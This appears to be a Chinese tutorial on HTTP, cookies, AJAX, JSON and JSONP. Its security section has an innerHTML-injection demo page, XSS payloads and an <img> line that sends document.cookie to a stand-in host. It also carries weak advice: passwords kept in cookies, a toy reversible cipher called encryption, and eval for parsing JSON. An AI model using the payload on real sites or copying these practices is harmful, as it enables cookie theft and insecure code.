# cookie

## 通信协议 

为了能够让不同设备通过网络进行互联互通、数据交互，必须规定大家都要遵守的标准“通信协议”。 当前ISO标准是7层网络模型： 

（1）应用层：对应应用程序的通信服务的。示例：telnet，HTTP,FTP,WWW,NFS,SMTP等。 

（2）表示层：定义数据格式及加密，例：FTP以二进制或ASCII格式传输。 

（3）会话层：完成连续消息通知表示层，表示层看到的数据是连续的。示例：RPC，SQL等。 

（4）传输层：不同应用的数据流的输入进行复用，数据包的重新排序功能。示例：TCP，UDP，SPX。 

（5）网络层：定义逻辑地址，路由实现的方式。示例：IP,IPX等。 

（6）数据链路层：如何将数据组合成数据块（帧）传送，如何处理传输差错。示例：ATM，FDDI等。 

（7）物理层：有关传输介质的特性标准。连接头、针、针的使用、电流等。示例：Rj45，802.3等。 

tips：

互联网使用TCP/IP协议： 

联网设备地址使用IP协议，如何打包数据，数据包编号使用TCP协议。 

TCP把应用程序的数据分割打成IP包，IP负责把包传给目标设备。 

## http

http（超文本传输协议）是一个基于请求与响应的应用层协议。 

host 主机名，对应IP地址的一个点或一段；port 端口号 ；abs_path 主机上的资源路径 。

请求方式： 

get请求，将请求数据作为url一部分发送，不安全，传输数据量小，方便易用。 

post请求，传输数据量大，安全，一般做表单提交。 

常见响应状态码： 

| 200  |          OK           |                       //客户端请求成功                       |
| :--: | :-------------------: | :----------------------------------------------------------: |
| 400  |      Bad Request      |          //客户端请求有语法错误，不能被服务器所理解          |
| 401  |     Unauthorized      | //请求未经授权，这个状态代码必须和WWW-Authenticate报头域一起使用 |
| 403  |       Forbidden       |              //服务器收到请求，但是拒绝提供服务              |
| 404  |       Not Found       |              //请求资源不存在，输入了错误的URL               |
| 500  | Internal Server Error |                  //服务器发生不可预期的错误                  |
| 503  |  Server Unavailable   |   //服务器当前不能处理客户端的请求，一段时间后可能恢复正常   |

## Cookie的概念 

cookie 是存储于访问者的计算机中的变量。每当同一台计算机通过浏览器请求某个页面时，就 会发送这个 cookie。你可以使用 JavaScript 来创建和取回 cookie 的值。 

你可以把用户的登录名密码存储于cookie中，就可以实现自动登录。 也可以用来保存购物车信息。 

Cookie的特点 

（1）cookie可能被禁用。 

（2）cookie是与浏览器相关的。不同浏览器所保存的cookie也是不能互相访问的。 

（3）cookie可能被用户删除。 

（4）cookie安全性不够高。如果要保存用户名密码等信息时，最好事先经过加密处理。 

（5）存储的数据量 4k 大小，cookie只支持存储string类型的数据。 

（6）简单易用。 

（7）信息存储于用户硬盘，因此可以作为全局变量。 

## Cookie格式 

cookie就是一串字符串，格式就是键值对，分号隔开，三个属性可有可无。 

cookieName=cookieValue;expires=GMTString;path=URLpath;domain=siteDomain 

cookie名称     cookie值        失效日期                 可访问url           可访问主机 

document.cookie=“cookieName=cookieValue”;//设置cookie 

没有指定失效日期的cookie在浏览器关闭后就消失。 

注：失效日期由date.toGMTString（）方法取得 

## 写入/读取cookie

写入7天后过期的cookie 

var date=new Date(); 

date.setDate(date.getDate()+7); 

document.cookie="userName=zhang; expires="+date.toGMTString(); 

document.cookie="userPws=123456; expires="+date.toGMTString();  

读取上边写入的cookie，因为cookie每次是全部获取，所以需要自己写解析cookie的代码。 

```javascript
var uname,upws;
var cookiearr=document.cookie.split("; ");
for(var i=0;i<cookiearr.length;i++){
var coocieItem=cookiearr[i].split("=");
if(coocieItem[0]=="userName"){
uname=coocieItem [1];
}
if(coocieItem[0]=="userPws"){
upws=coocieItem [1];
}
}
```

## cookie的其它操作

添加与覆盖： 浏览器用cookie名称来区别cookie，添加不同名称cookie会一直续在前一个cookie后，同名的cookie会覆盖值。 

删除cookie： 不能直接删除cookie，但是设置失效日期为过去，浏览器会删除cookie。 

中文及特殊字符支持： 使用escape（）函数编码cookie值，读取时使用unescape（）函数解码。 

判断cookie是否存在： document.cookie.indexOf(NameOfCookie+“=”); //使用字符串函数indexOf 。

```javascript
例：document.cookie=“str=”+escape(“I love ajax”);相当于document.cookie="str=I%20love%20ajax"; 
```

## Json2的方法 

JSON2.js文件提供字符串转JSON和JSON转字符串的方法 

```javascript
JSON.parse()【从一个字符串中解析出JSON对象】
例子：
var data='{"name":"goatling"}'
JSON.parse(data)
结果是：
{name:"goatling“}
JSON.stringify()【从一个JSON对象中解析出字符串】
var data={name:'goatling'}
JSON.stringify(data)
结果是：
'{"name":"goatling"}‘
```

## cookie的安全策略 

XSS攻击： 跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写 混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之 时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。 

### cookie的安全策略（攻击代码示例） 

```javascript
html代码
 <body>
<span id="s"></span>
<textarea id="txtId" style="width:200px;height:200px" ></textarea>
<input id="btn" type="button" value="测试" />
</body>
 script代码
window.onload = function(){
document.getElementById("btn").onclick = function(){
 document.getElementById("s").innerHTML = document.getElementById("txtId").value;
}
}
 运行html页面，在文本域里输入：
<a href="" onclick="javascript:{alert('dd');for(var i=0;i<10;i++){alert(i)}}" >百度</a>
cookie的安全策略
XSS攻击：
<script>alert(document.cookie)</script>
<a href="" onclick="javascript:(function(){alert(444);})()">超级</a>
这段代码能够发送当前cookie到www.xxx.com
<img src='http://www.xxx.com?cookie='+document.cookie;/>
cookie欺骗：
拿到cookie后，分析出用户名和密码，然后修改自己的cookie为分析出的用户名密码，访问网站成功登
录。
如何防范：
1，Html转码（防止“<”等特殊字符，防止注入js）
2，敏感信息加密
3，cookie和ip地址绑定（cookie检查ip地址，ip和cookie不符的不能登录，需要服务器端配合）
```

### cookie的安全策略

1.转码加密

```javascript
//加密 abcd 经过compile() 后 e
function compile(code)
{
 var c=String.fromCharCode(code.charCodeAt(0)+code.length);
 for(var i=1;i<code.length;i++){
 c+=String.fromCharCode(code.charCodeAt(i)+code.charCodeAt(i-1));
 }
 return(escape(c));
}
//解密
function uncompile(code)
{
 code=unescape(code);
 var c=String.fromCharCode(code.charCodeAt(0)-code.length);
 for(var i=1;i<code.length;i++){
 c+=String.fromCharCode(code.charCodeAt(i)-c.charCodeAt(i-1));
 }
 return c; 
```

### cookie的封装

```javascript
设置cookie
function setCookie (key, value, t) {
var oDate = new Date();
oDate.setDate(oDate.getDate() + t);
document.cookie = key + ‘=’ +escape(value) + '; expires=' + oDate.toGMTString()
}
获取cookie
function getCookie (key) {
var arr1 = document.cookie.split(';');
for( var i=0;i<arr1.length; i++ ) {
var arr2 = arr1[i].split('=');
if( arr2[0] == key ){
return unescape(arr2[1]);
}
}
}

```

## ajax

### AJAX的概念及优势 

#### AJAX概念



AJAX（Asynchronous JavaScript And XML），（异步 JavaScript 和 XML），中 文名：阿贾克斯。是指一种创建交互式网页应用的网页开发技术.

AJAX 是一种在无需重新加载整个网页的情况下，能够更新部分网页的技术 

前端通过与服务器进行少量数据交换，AJAX 可以使网页实现异步更新。

这意味着可以在不重新 加载整个网页的情况下，对网页的某部分进行更新。传统的网页（不使用 Ajax）如果需要更新内 容，必须重载整个网页页面。 

#### 为什么要使用AJAX 

更自然、流畅的用户体验，对用户的操作即时响应 

在不中断用户操作的情况下与Web服务器进行通信 

更灵敏的响应用户访问，实现近似于桌面应用程序的交互效果 

通过局部更新页面降低网络流量，提高网络的使用效率 

tips:

异步：同时执行，也叫并发 

同步 ：按步骤顺序执行 

get和post就是客户端给服务器传输数据的方式。 

 get: 速度快，传输的数据量小，安全性不好 

 post:速度慢，传输的数据量大，安全性好 

### AJAX中的核心XMLHttpRequest的使用 

#### XMLHttpRequest对象 

​	AJAX的核心对象是XMLHttpRequest，即AJAX的异步操作，和服务器 交互主要依 赖该对象。 XMLHttpRequest 对象提供了对 HTTP 协议的完全的访问，包括做出 POST 和 HEAD 请求以及普通的 GET 请求的能力 

#### XMLHttpRequest的理解  

​	以前浏览器负责显示和发送请求接收响应。两件事情同一时刻只能做一件，没法同时进行 。这样会让用户感觉不好(友好性不好)，比如：当浏览器发送请求时，就没法显示内容，这时 浏览器中是空白显示，给用户的感觉不好。 使用XMLHttpRequest对象，可以把浏览器解脱出来，可以让浏览器只负责显示，而完成 请求的事情由XMLHttpRequest对象负责。这样两者各负其责，效率更高，效果更好，用户 体验很好，用户永远不会看到浏览器空白。 

### AJAX编写步骤 

```javascript
1、创建XMLHttpRequest对象
var request = new XMLHttpRequest();
2、设置请求参数
request.open("get", "http://10.0.152.17/AJAX/ajaxtest", true);
3、设置回调函数
 request.onreadystatechange = function(){
if(request.readyState == 4) {
alert(request.responseText);
}
 }
4、发送请求
request.send();
5、接收响应
 request.responseText或者request.responseXML
```

#### 创建XMLHttpRequest 

​	XMLHttpRequest对象最初是在IE5中以ActiveX组件的形式实现的，但只能在IE浏览 器中使用。其后在Mozilla、Safari等浏览器中相继实现，才成为事实上的标准。目 前FireFox、Safari、Opera和IE7中都以类似的方式实现了XMLHttpRequest对象 

​	由于XMLHttpRequest不是w3c的标准，可以采用多种方法创建XMLHttpRequest对象。 在使用XMLHttpRequest对象发生请求和处理之前，必须首先使用JavaScript获得 XMLHttpRequest对象  

```javascript
function getHttpRequest()
{
 if (window.ActiveXObject){
 return new ActiveXObject("Microsoft.XMLHttp");
 }
 else
{
 return new XMLHttpRequest();
 }
}
```

#### XMLHttpRequest的属性 

| 属性               | 描述                                                         |
| ------------------ | ------------------------------------------------------------ |
| onreadystatechange | 每次状态改变所触发事件的事件处理程序                         |
| readyState         | 对象状态值： 0 = 未初始化（uninitialized）对象创建完毕就是0 1 = 正在加载（loading） 1：对象设置完成后就是1.即调用open函数后 2 = 加载完毕（loaded） 3 = 交互（interactive） 4 = 完成（complete） |
| responseText       | 从服务器进程返回的数据的字符串形式                           |
| responseXML        | 从服务器进程返回的DOM兼容的文档数据对象                      |
| status             | 从服务器返回的数字代码，如404（未找到）或200（就绪）         |
| statusText         | 伴随状态码的字符串信息                                       |

#### XMLHttpRequest的方法 

| 方法                                 | 描述                                                         |
| ------------------------------------ | ------------------------------------------------------------ |
| abort（）                            | 停止当前请求                                                 |
| getAllResponseHeaders()              | 将所有HTTP请求的响应首部作为键/值对返回                      |
| getResponseHeader(”header”)          | 返回指定响应的首部信息                                       |
| open(”method” , ”URL”)               | 建立对服务器的调用，方法通常是post或get，URL可以绝对路径 或相对路径 |
| send(content)                        | 向服务器发送请求，参数可以是null                             |
| setRequestHeader(”header” , ”value”) | 设置HTTP请求的首部信息，可以向服务器传递参数，这个方法必 须在open之后调用。 |

#### ajax实例

```javascript
var oRequest;
function getTitleInfo(titleid){
oRequest = getHttpRequest(); // 获得XMLHttpRequest对象
oRequest.open(“get” , “AJAXServlet” , true); // 建立对服务器的异步调用
oRequest.onreadystatechange = myfun;
oRequest.send(null); // 向服务器发送异步调用请求
}
function myfun(){
 // 显示书籍信息（回调处理）
 if (oRequest.readyState == 4&&oRequest.status==200)
 {
 var result = oRequest.responseText;
 var msgdiv = document.getElementById("message");
 msgdiv.innerHTML = result;
 }
}
```

#### http响应的状态码

 注意：在对错误进行处理时，只将少数常见的错误消息输出给用户了。尽管这是朝正确方向 前进的一步，但是要告诉从事应用程序开发的用户和程序员究竟发生了什么问题。 

| HTTP状态码    | 摘要说明                                 |
| ------------- | ---------------------------------------- |
| 成功2××       | 成功处理了请求的状态码                   |
| 200           | 服务器已成功处理了请求并提供了请求的网页 |
| 重定向3××     | 每次请求中使用重定向不要超过 5 次        |
| 客户端错误4×× | 表示请求可能出错，妨碍了服务器的处理     |
| 404           | 服务器找不到请求的网页                   |
| 500           | 服务器遇到错误，无法完成请求             |

#### AJAX交互示例post请求 

```javascript
var oRequest;
function getTitleInfo(titleid){
oRequest = getHttpRequest(); // 获得XMLHttpRequest对象
 var postStr = "user_name="+ userName +"&user_age="+ userAge ;
oRequest.open(“POST” , “AJAXServlet” , true); // 建立对服务器的异步调用
AJAX.setRequestHeader("Content-Type",
 "application/x-www-form-urlencoded");
 oRequest.onreadystatechange = myfun;
oRequest.send(postStr); // 向服务器发送异步调用请求
}
function myfun(){// 显示书籍信息（回调处理）
 if (oRequest.readyState == 4&&oRequest.status==200)
 {
 var result = oRequest.responseText;
 var msgdiv = document.
 getElementById("message");
 msgdiv.innerHTML = result;
 }
}
```



### JSON数据的应用 

#### JSON 

JSON（JavaScript Object Notation） 

AJAX技术能够使得每一次请求更加迅捷，对于每一次请求返回的不是整个页面，只仅仅是所需要 返回的数据。通常AJAX通过返回XML格式的数据，然后再通过客户端复杂的JavaScript脚本解析和 渲染这些XML格式的数据。

JSON（读Jason）是为了能够使得数据格式成为一种标准，更简单的被JavaScript解析 

#### 优点

– 轻量级的数据交换格式 

– 人们读写更加容易

 – 易于机器的解析和生成 

– 能够通过JavaScript中eval()函数解析JSON 

– JSON支持多语言。包括：ActionScript, C, C#, ColdFusion, E, Java, JavaScript, ML, Objective CAML, Perl, PHP, Python, Rebol, Ruby, and Lua. 

#### json的具体形式

JSON语法是一种用于传输和生成数据的协定，很类似于C家族的语言，所以很容 易被C家族的语言所解析。

对象：对象包含在{}之间 

属性：采用Key-Value对来表示。属性之间使用逗号分开。 string : value 

数组：数组存放在[]之间 [ elements ]  元素：元素之间用逗号分开 

值：值可以是字符串，数字，对象，数组，true，false，null  

#### JSON数据格式的例子： 

```javascript
{
 "name":"张三",
 "password":"123456",
 "department":"技术部",
 "sex":"男",
 "old":"28"
 }
```

````javascript
JSON数据格式的例子(嵌套)：
{
"name":"章子怡",
 "address":
 {"city":"Beijing",
 "street":" Chaoyang Road ",
 "postcode":100025
 }
 };
````

#### 人员的详细地址信息 

```javascript
<script language="javascript">
function handleJson() {
 var j={
"name":"章子怡",
"address":
 {
 "city":"Beijing",
 "street":" Chaoyang Road ",
 "postcode":100025
}
};
 alert(j.name+"所在城市："+j.address.city);
}
</script>
<body>
<input type="button" name="Submit" value="按钮" onClick="handleJson()">
</body>
```

#### eval  

作用： eval() 函数可计算某个字符串，并执行其中的 JavaScript 代码。 即这个函数可以把一个字符串当作一个JavaScript表达式一样去执行它 

语法：eval(string) 参数string必需。要计算的字符串，其中含有要计算的 JavaScript 表达式 或要执行的语句。 如：服务器端返回一个JSON字符串，需要用eval把它转换为对象。或者数 组。 eval("("+json字符串+")"); 

返回值： 通过计算 string 得到的值（如果有的话），即参数string有返回值，则eval 的执行结果就有返回值 

## JSONP

### 什么是跨域访问 

同源策略：JavaScript或Cookie只能访问同域名下的内容。 

跨域访问就是跨域名访问，即A网站的网页在代码上访问了B网站的页面 ,由于同源策略（浏览器的安全机制），所以，AJAX不能实现跨域访问。 

### 跨域访问的几种方式 

最早的AJAX不支持跨域访问，为了达到跨域访问的目的，出现了很多的解决方案 ：JSONP,iframe,flash,xhr2 等。但是比较常用的是JSONP。 

### JSONP 

JSONP（JSON with Padding）可用于解决主流浏览器的跨 域数据访问的问题）。跟JSON没有关系。 

JSONP是如何实现跨域访问的？本质上是利用HTML元素的 src属性都可以跨域的思路来解决的。 

如：img，script，iframe等标记的src属性的值都可以赋成其它 域名的合法地址。 

示例一：

```javascript
A域名中的文件（demo01.html）代码（可以用本地硬盘模拟
A域名）
<script type="text/javascript">
function localFunc(){
 alert("我这个函数是其它网站上的js文件调用的");
}
</script>
<script type="text/javascript" src="http://127.0.0.1:8080/jsonp/test01.js"></script>
B域名中的文件(test01.js)代码：
 localFunc();
运行A域名中的文件
```

示例二

```javascript
A域名中的文件（demo01.html）代码（可以用本地硬盘模拟A域
名）
<script type="text/javascript">
function localFunc(str){
alert("其它网站上的jsp文件给我传来了："+str);
}
</script>
<script type="text/javascript" src="http://192.168.48.22:8080/jsonp/test02.jsp"></script>
B域名中的文件(test02.jsp)代码：
<%@ page contentType="text/html; charset=utf-8" language="java" import="java.sql.*" errorPage="" %>
<%
out.print("alert('hello');");
out.print("localFunc('亲，我是江泽民');");
%>
运行A域名中的文件
```

示例三： 

```javascript
把客户端要调用的函数名，传给服务器端，这样，就需要动态产生script
标记，动态设置script标记的src属性的值.
```



### JSONP和AJAX的跨域访问 

AJAX中的跨域是： 在服务器端的页面上增加以下代码完成。 

response.setHeader("Access-Control-Allow-Origin", "*"); 

第二个参数 *:表示所有的跨域请求都可以； http://www.xxx.com:表示只允许域名www.xxx.com的跨域请求。 

jsonp不是AJAX中实现跨域访问的技术 

1、jsonp没有使用XMLHttpRequest对象。 

2、jsonp只是在一种跨域的技巧。 

3、jsonp只支持Get方式 

由于按照jsonp的这种方式跨域访问时，好像可以利用javascript和服务器端交互， 能达到AJAX中XMLHttpRequest对象同样的效果。所以，人们总是把 jsonp和AJAX联系在一起。 